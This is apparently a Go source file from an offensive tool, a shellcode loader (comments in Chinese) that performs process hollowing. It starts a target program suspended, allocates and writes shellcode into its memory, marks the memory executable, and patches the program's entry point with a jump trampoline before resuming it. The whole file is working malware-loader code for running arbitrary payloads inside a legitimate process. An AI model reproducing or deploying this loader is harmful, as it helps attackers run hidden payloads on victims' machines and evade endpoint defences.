package loader

import (
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
	"variant/log"
	"variant/xwindows"
)

// ProcessHollower 进程镂空结构体
type ProcessHollower struct {
	shellcode      []byte
	targetProgram  string
	procInfo       *windows.ProcessInformation
	startupInfo    *windows.StartupInfo
	pebBaseAddress uintptr // 存储PEB基地址
	imageBase      uintptr // 存储镜像基地址
	machineType    uint16  // 机器类型
}

// NewProcessHollower 创建新的进程镂空实例
func NewProcessHollower(shellcode []byte, program string) *ProcessHollower {
	return &ProcessHollower{
		shellcode:     shellcode,
		targetProgram: program,
		procInfo:      &windows.ProcessInformation{},
		startupInfo:   &windows.StartupInfo{},
	}
}

// CreateProcess 创建挂起的进程
func (ph *ProcessHollower) CreateProcess() error {
	ph.startupInfo.Flags = windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED
	ph.startupInfo.ShowWindow = 1

	err := windows.CreateProcess(
		windows.StringToUTF16Ptr(ph.targetProgram),
		nil,
		nil,
		nil,
		true,
		windows.CREATE_SUSPENDED,
		nil,
		nil,
		ph.startupInfo,
		ph.procInfo,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to create process: %w", err)
	}

	log.Infof("Process created successfully with PID: %d", ph.procInfo.ProcessId)
	return nil
}

// AllocateMemory 在目标进程中分配内存
func (ph *ProcessHollower) AllocateMemory() (uintptr, error) {
	addr, err := xwindows.VirtualAllocEx(
		ph.procInfo.Process,
		0,
		uintptr(len(ph.shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return 0, fmt.Errorf("failed to allocate memory: %w", err)
	}

	if addr == 0 {
		return 0, fmt.Errorf("virtualallocex returned null address")
	}

	log.Infof("Memory allocated at address: 0x%x", addr)
	return addr, nil
}

// WriteShellcode 将shellcode写入目标进程
func (ph *ProcessHollower) WriteShellcode(addr uintptr) error {
	err := xwindows.WriteProcessMemory(
		ph.procInfo.Process,
		addr,
		&ph.shellcode[0],
		uintptr(len(ph.shellcode)),
		nil,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to write shellcode: %w", err)
	}

	log.Infof("Shellcode written successfully")
	return nil
}

// ChangeMemoryProtection 修改内存保护属性
func (ph *ProcessHollower) ChangeMemoryProtection(addr uintptr) error {
	oldProtect := windows.PAGE_READWRITE
	err := xwindows.VirtualProtectEx(
		ph.procInfo.Process,
		addr,
		uintptr(len(ph.shellcode)),
		windows.PAGE_EXECUTE_READ,
		(*uint32)(unsafe.Pointer(&oldProtect)),
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to change memory protection: %w", err)
	}

	log.Infof("Memory protection changed to PAGE_EXECUTE_READ")
	return nil
}

// GetPEBAddress 获取PEB地址
func (ph *ProcessHollower) GetPEBAddress() error {
	var processInfo windows.PROCESS_BASIC_INFORMATION
	var returnLength uint32

	status, err := xwindows.NtQueryInformationProcess(
		ph.procInfo.Process,
		windows.ProcessBasicInformation,
		unsafe.Pointer(&processInfo),
		unsafe.Sizeof(processInfo),
		(*uintptr)(unsafe.Pointer(&returnLength)),
	)

	if err != nil {
		return fmt.Errorf("failed to query process information: %w", err)
	}

	if status != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed with status: 0x%x", status)
	}

	// 获取PEB基地址
	pebBaseAddress := uintptr(unsafe.Pointer(processInfo.PebBaseAddress))
	ph.pebBaseAddress = pebBaseAddress

	log.Infof("PEB address retrieved: 0x%x", pebBaseAddress)
	return nil
}

// ReadImageBaseFromPEB 从PEB中读取镜像基地址
func (ph *ProcessHollower) ReadImageBaseFromPEB() error {
	// 定义PEB结构的关键部分（简化版）
	var pebImageBase uintptr

	var bytesRead uintptr
	err := xwindows.ReadProcessMemory(
		ph.procInfo.Process,
		ph.pebBaseAddress+0x10, // ImageBase在PEB中的偏移量通常是0x10
		(*byte)(unsafe.Pointer(&pebImageBase)),
		unsafe.Sizeof(pebImageBase),
		&bytesRead,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to read image base from PEB: %w", err)
	}

	if bytesRead != unsafe.Sizeof(pebImageBase) {
		return fmt.Errorf("incomplete read from PEB, expected %d bytes, got %d bytes",
			unsafe.Sizeof(pebImageBase), bytesRead)
	}

	ph.imageBase = pebImageBase
	log.Infof("Image base address from PEB: 0x%x", ph.imageBase)
	return nil
}

// ReadImageHeaders 读取镜像头信息
func (ph *ProcessHollower) ReadImageHeaders() (uintptr, error) {
	// 首先验证imageBase是否有效
	if ph.imageBase == 0 {
		return 0, fmt.Errorf("invalid image base address: 0x%x", ph.imageBase)
	}

	// 读取DOS头
	var dosHeader xwindows.IMAGE_DOS_HEADER
	var bytesRead uintptr

	err := xwindows.ReadProcessMemory(
		ph.procInfo.Process,
		ph.imageBase,
		(*byte)(unsafe.Pointer(&dosHeader)),
		unsafe.Sizeof(dosHeader),
		&bytesRead,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return 0, fmt.Errorf("failed to read DOS header: %w", err)
	}

	if bytesRead != unsafe.Sizeof(dosHeader) {
		return 0, fmt.Errorf("incomplete DOS header read, expected %d bytes, got %d bytes",
			unsafe.Sizeof(dosHeader), bytesRead)
	}

	// 验证DOS头签名
	if dosHeader.E_magic != 0x5A4D { // "MZ"
		return 0, fmt.Errorf("invalid DOS header signature: 0x%x", dosHeader.E_magic)
	}

	// 读取NT头签名
	var signature uint32
	err = xwindows.ReadProcessMemory(
		ph.procInfo.Process,
		ph.imageBase+uintptr(dosHeader.E_lfanew),
		(*byte)(unsafe.Pointer(&signature)),
		unsafe.Sizeof(signature),
		&bytesRead,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return 0, fmt.Errorf("failed to read NT signature: %w", err)
	}

	if bytesRead != unsafe.Sizeof(signature) {
		return 0, fmt.Errorf("incomplete NT signature read, expected %d bytes, got %d bytes",
			unsafe.Sizeof(signature), bytesRead)
	}

	// 验证NT头签名
	if signature != 0x00004550 { // "PE\0\0"
		return 0, fmt.Errorf("invalid NT header signature: 0x%x", signature)
	}

	// 读取文件头
	var fileHeader xwindows.IMAGE_FILE_HEADER
	err = xwindows.ReadProcessMemory(
		ph.procInfo.Process,
		ph.imageBase+uintptr(dosHeader.E_lfanew)+unsafe.Sizeof(signature),
		(*byte)(unsafe.Pointer(&fileHeader)),
		unsafe.Sizeof(fileHeader),
		&bytesRead,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return 0, fmt.Errorf("failed to read file header: %w", err)
	}

	if bytesRead != unsafe.Sizeof(fileHeader) {
		return 0, fmt.Errorf("incomplete file header read, expected %d bytes, got %d bytes",
			unsafe.Sizeof(fileHeader), bytesRead)
	}

	ph.machineType = fileHeader.Machine

	// 计算可选头的偏移
	optionalHeaderOffset := ph.imageBase + uintptr(dosHeader.E_lfanew) + unsafe.Sizeof(signature) + unsafe.Sizeof(fileHeader)

	// 读取可选头并获取入口点
	var entryPoint uintptr
	switch fileHeader.Machine {
	case 0x8664: // x64
		var optHeader64 xwindows.IMAGE_OPTIONAL_HEADER64
		err = xwindows.ReadProcessMemory(
			ph.procInfo.Process,
			optionalHeaderOffset,
			(*byte)(unsafe.Pointer(&optHeader64)),
			unsafe.Sizeof(optHeader64),
			&bytesRead,
		)

		if err != nil && err.Error() != "The operation completed successfully." {
			return 0, fmt.Errorf("failed to read optional header (x64): %w", err)
		}

		if bytesRead != unsafe.Sizeof(optHeader64) {
			return 0, fmt.Errorf("incomplete optional header read, expected %d bytes, got %d bytes",
				unsafe.Sizeof(optHeader64), bytesRead)
		}

		entryPoint = ph.imageBase + uintptr(optHeader64.AddressOfEntryPoint)
		log.Infof("x64 executable detected, entry point: 0x%x", entryPoint)

	case 0x14c: // x86
		var optHeader32 xwindows.IMAGE_OPTIONAL_HEADER32
		err = xwindows.ReadProcessMemory(
			ph.procInfo.Process,
			optionalHeaderOffset,
			(*byte)(unsafe.Pointer(&optHeader32)),
			unsafe.Sizeof(optHeader32),
			&bytesRead,
		)

		if err != nil && err.Error() != "The operation completed successfully." {
			return 0, fmt.Errorf("failed to read optional header (x86): %w", err)
		}

		if bytesRead != unsafe.Sizeof(optHeader32) {
			return 0, fmt.Errorf("incomplete optional header read, expected %d bytes, got %d bytes",
				unsafe.Sizeof(optHeader32), bytesRead)
		}

		entryPoint = ph.imageBase + uintptr(optHeader32.AddressOfEntryPoint)
		log.Infof("x86 executable detected, entry point: 0x%x", entryPoint)

	default:
		return 0, fmt.Errorf("unknown machine type: 0x%x", fileHeader.Machine)
	}

	log.Infof("Image headers read successfully, Machine: 0x%x, Entry point: 0x%x",
		fileHeader.Machine, entryPoint)
	return entryPoint, nil
}

// CreateTrampoline 创建跳转代码
func (ph *ProcessHollower) CreateTrampoline(shellcodeAddr uintptr) ([]byte, error) {
	var trampoline []byte

	switch ph.machineType {
	case 0x8664: // x64
		// mov rax, address
		trampoline = append(trampoline, 0x48, 0xb8)
		addressBuffer := make([]byte, 8)
		binary.LittleEndian.PutUint64(addressBuffer, uint64(shellcodeAddr))
		trampoline = append(trampoline, addressBuffer...)

	case 0x14c: // x86
		// mov eax, address
		trampoline = append(trampoline, 0xb8)
		addressBuffer := make([]byte, 4)
		binary.LittleEndian.PutUint32(addressBuffer, uint32(shellcodeAddr))
		trampoline = append(trampoline, addressBuffer...)

	default:
		return nil, fmt.Errorf("unknown machine type for trampoline: 0x%x", ph.machineType)
	}

	// jmp [r|e]ax
	trampoline = append(trampoline, 0xff, 0xe0)

	log.Infof("Trampoline created, size: %d bytes", len(trampoline))
	return trampoline, nil
}

// WriteTrampoline 将跳转代码写入入口点
func (ph *ProcessHollower) WriteTrampoline(entryPoint uintptr, trampoline []byte) error {
	err := xwindows.WriteProcessMemory(
		ph.procInfo.Process,
		entryPoint,
		&trampoline[0],
		uintptr(len(trampoline)),
		nil,
	)

	if err != nil && err.Error() != "The operation completed successfully." {
		return fmt.Errorf("failed to write trampoline: %w", err)
	}

	log.Infof("Trampoline written to entry point: 0x%x", entryPoint)
	return nil
}

// ResumeProcess 恢复进程执行
func (ph *ProcessHollower) ResumeProcess() error {
	_, err := xwindows.ResumeThread(ph.procInfo.Thread)
	if err != nil {
		return fmt.Errorf("failed to resume thread: %w", err)
	}

	log.Infof("Process resumed successfully")
	return nil
}

// Cleanup 清理资源
func (ph *ProcessHollower) Cleanup() {
	if ph.procInfo.Process != 0 {
		xwindows.CloseHandle(ph.procInfo.Process)
	}
	if ph.procInfo.Thread != 0 {
		xwindows.CloseHandle(ph.procInfo.Thread)
	}
	log.Infof("Process handles closed")
}

// Execute 执行完整的进程镂空流程
func (ph *ProcessHollower) Execute() error {
	defer ph.Cleanup()

	// 1. 创建挂起进程
	if err := ph.CreateProcess(); err != nil {
		return fmt.Errorf("create process failed: %w", err)
	}

	// 2. 分配内存
	shellcodeAddr, err := ph.AllocateMemory()
	if err != nil {
		return fmt.Errorf("allocate memory failed: %w", err)
	}

	// 3. 写入shellcode
	if err := ph.WriteShellcode(shellcodeAddr); err != nil {
		return fmt.Errorf("write shellcode failed: %w", err)
	}

	// 4. 修改内存保护
	if err := ph.ChangeMemoryProtection(shellcodeAddr); err != nil {
		return fmt.Errorf("change memory protection failed: %w", err)
	}

	// 5. 获取PEB地址
	if err := ph.GetPEBAddress(); err != nil {
		return fmt.Errorf("get PEB address failed: %w", err)
	}

	// 6. 从PEB读取镜像基地址
	if err := ph.ReadImageBaseFromPEB(); err != nil {
		return fmt.Errorf("read image base from PEB failed: %w", err)
	}

	// 7. 读取镜像头信息并获取入口点
	entryPoint, err := ph.ReadImageHeaders()
	if err != nil {
		return fmt.Errorf("read image headers failed: %w", err)
	}

	// 8. 创建跳转代码
	trampoline, err := ph.CreateTrampoline(shellcodeAddr)
	if err != nil {
		return fmt.Errorf("create trampoline failed: %w", err)
	}

	// 9. 写入跳转代码
	if err := ph.WriteTrampoline(entryPoint, trampoline); err != nil {
		return fmt.Errorf("write trampoline failed: %w", err)
	}

	// 10. 恢复进程执行
	if err := ph.ResumeProcess(); err != nil {
		return fmt.Errorf("resume process failed: %w", err)
	}

	log.Infof("Process hollowing completed successfully")
	return nil
}

func ProcessHollowing(sc []byte, program string) error {
	hollower := NewProcessHollower(sc, program)
	return hollower.Execute()
}
